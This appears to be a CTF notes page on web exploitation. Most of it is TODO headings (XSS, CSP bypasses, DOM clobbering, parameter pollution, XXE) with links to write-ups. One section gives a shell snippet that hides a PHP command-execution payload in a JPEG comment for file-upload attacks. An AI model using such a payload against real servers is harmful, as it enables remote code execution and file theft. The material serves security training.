# Web

Web challenges can range a lot. This page aims to cover many common topics for both client and server challenges.

## Client-side

### Cross-Site Scripting (XSS)

TODO

This section only covered some of the basics of XSS; techniques from the below sections can be used in tandem with this information to create solutions for more complex environments.

#### XSS Sanitization

TODO: DOMpurify
TODO: native browser APIs

### JavaScript Utilities

TODO
TODO: fetch and XHR

### Content Security Policy (CSP)

#### JSONP Bypasses

TODO

#### Script `src` Directory Bypasses

TODO

### DOM Clobbering

#### The Basics

TODO

Excellent resources (with many good examples) on this topic include:

* [Postcards from the post-XSS world](http://lcamtuf.coredump.cx/postxss/)
* [Clobbering the clobbered - Advanced DOM Clobbering](https://medium.com/@terjanq/dom-clobbering-techniques-8443547ebe94)
* [The Spanner - DOM Clobbering](http://www.thespanner.co.uk/2013/05/16/dom-clobbering/)

#### Generic HTML Tag Primitives

TODO

#### Chromium-based Browser HTML Tag Primitives

TODO

### Open Redirects

TODO

### Dangling Markup Exfiltration

TODO: http://lcamtuf.coredump.cx/postxss/

### CSS Exfiltration

TODO

## Server-side

TODO

### File Uploads

### Crafting Custom Images

Image manipulation on the command-line makes crafting payloads a little bit easier:
```sh
# create an empty image
convert -size 32x32 xc:white empty.jpg

# add a comment to an image
exiftool -Comment $'<?php system("cat fl* /fl* /home/*/fl*"); ?>' empty.jpg
```

### Nginx Knowledge

TODO: well-known path bypass

### Apache Knowledge

TODO

### PHP Tips and Tricks

TODO: https://paste.q3k.org/paste/mp0iN5mw#xy+cOL+ON0sWRaJ7p1NZAFkcDTM1BKkYXaq9vZthxK0
TODO: https://blog.orange.tw/2018/10/hitcon-ctf-2018-one-line-php-challenge.html

### HTTP Parameter Pollution

TODO
TODO: PHP usually gives preference to the last occurrence
TODO: Flask ImmutableDict gets last occurence of parameter
TODO: Django param dict? will get first occurence of parameter
TODO: express.js gives array of all provided values
TODO: differences between WAF and web app parsing can lead to bypass
TODO: payloads can be built if parameter values are concatenated

### XXE

TODO: trying application/xml for API endpoints

TODO: linux/windows general gagdets
TODO: https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/
TODO: leaking file contents from errors that report file name (https://www.youtube.com/watch?v=0fdpFQXWVu4)
